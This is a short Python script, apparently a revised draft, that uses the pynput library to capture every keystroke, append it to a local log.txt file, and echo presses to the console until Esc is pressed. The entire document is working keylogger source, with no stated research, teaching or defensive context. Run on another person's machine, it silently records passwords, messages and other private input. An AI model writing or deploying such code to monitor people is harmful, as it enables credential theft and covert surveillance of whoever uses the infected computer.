import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'a') as f:  # Changed 'w' to 'a'
        for key in keys:
            # Removing quotes
            k = str(key).replace("'", "")
            # Formatting for special keys
            if 'Key' in k:
                k = k.replace('Key.', '')

            f.write(k)
            f.write(' ')

    keys.clear()  # Clear the keys list after writing to the file

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:  # Correctly checking for escape key
        # Stop listener
        return False

with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
